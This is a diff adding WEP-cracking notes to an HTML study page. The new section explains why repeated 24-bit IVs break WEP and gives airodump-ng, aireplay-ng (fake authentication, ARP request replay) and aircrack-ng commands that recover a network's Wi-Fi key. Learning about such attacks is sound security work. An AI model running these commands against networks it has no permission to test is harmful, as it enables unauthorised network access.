@@ -255,10 +255,72 @@
             <li>Old encryption</li>
             <li>RC4 - algorithm</li>
             <li>Still uses in some networks. can be cracked easily </li>
-            <li>client/router -  send/recieve - encrypt/decrypt packets by using a key</li>
+            <li>client/router - send/recieve - encrypt/decrypt packets by using a key</li>
         </ul>
 
+        <h3>Vulnerability?</h3>
+        <ul class="usage">
+            <li>Each packet is encrypted using a unique key stream</li>
+            <li>Random initialization vector(IV) is used to generate the keys streams</li>
+            <li>IV is only 24 bits</li>
+            <li>IV + key(password) = key stream </li>
+            <li>client/router - send/recieve - encrypt/decrypt packets by using a key</li>
+            <li>IV is sent in plaintext</li>
+            <li>IV will repeat on busy networks. This makes WEP vulnerable to statistical attacks</li>
+            <li>Repeated IV can be used to determine the key stream and break the encryption</li>
+        </ul>
+        <h3>AIRODUMP-NG & aircrack-ng</h3>
+        <ul class="usage">
+            <li>Capture a large number of packets / IVs</li>
+            <li>Analyse the captured IVs and crack the key</li>
+        </ul>
+        <pre><code>
+    <i class="comment">// collect packets</i>
+    <b class='terminal'>#</b> airodump-ng --bssid F9:24:B3:B0:51:AC --channel 2 --write basic_wep mon0
 
+    <i class="comment">// To crack key</i>
+    <b class='terminal'>#</b> aircrack-ng basic_wep-01.cap
+
+</code></pre>
+        <ul class="usage">
+            <li>Copy the key and remove all columns - this is the password of Wi-Fi</li>
+            <li>Problem - If network not busy, It would take some time to capture enough IVs</li>
+            <li>Solution - Force the AP to generate new IVs</li>
+        </ul>
+        <h3>Fake Authentication attack</h3>
+        <ul class="usage">
+            <li>Force the AP to generate new IVs</li>
+        </ul>
+        <pre><code>
+    <i class="comment">// collect packets</i>
+    <b class='terminal'>#</b> airodump-ng --bssid F9:24:B3:B0:51:AC --channel 2 --write arpreplay mon0
+
+    <i class="comment">// a - target , h - your device (ifconfig - first 12 digits of unspec - change '-' to ':')</i>
+    <b class='terminal'>#</b> aireplay-ng --fakeauth 0 -a F9:24:B3:B0:51:AC -h F2:34:B4:B0:61:BC mon0
+
+    <i class="comment">// To crack key</i>
+    <b class='terminal'>#</b> aircrack-ng arpreplay-01.cap
+
+</code></pre>
+        <h3>ARP Request Replay attack</h3>
+        <ul class="usage">
+            <li>Force the AP to generate new IVs</li>
+            <li>Wait for an ARP packet , capture it and replay(retransmit) it</li>
+            <li>This causes the AP to produce another packet with a new IV</li>
+            <li>Keep doing this till we have enough IVs to crack the key</li>
+        </ul>
+        <pre><code>
+    <i class="comment">// collect packets</i>
+    <b class='terminal'>#</b> airodump-ng --bssid F9:24:B3:B0:51:AC --channel 2 --write arpreplay mon0
+
+    <i class="comment">// b - target , h - your device (ifconfig - first 12 digits of unspec - change '-' to ':')</i>
+    <b class='terminal'>#</b> aireplay-ng --arpreplay -b F9:24:B3:B0:51:AC -h F2:34:B4:B0:61:BC mon0
+
+    <i class="comment">// To crack key</i>
+    <b class='terminal'>#</b> aircrack-ng arpreplay-01.cap
+
+</code></pre>
+        <br>
     </section>
 
     <div style="overflow-x:auto;">
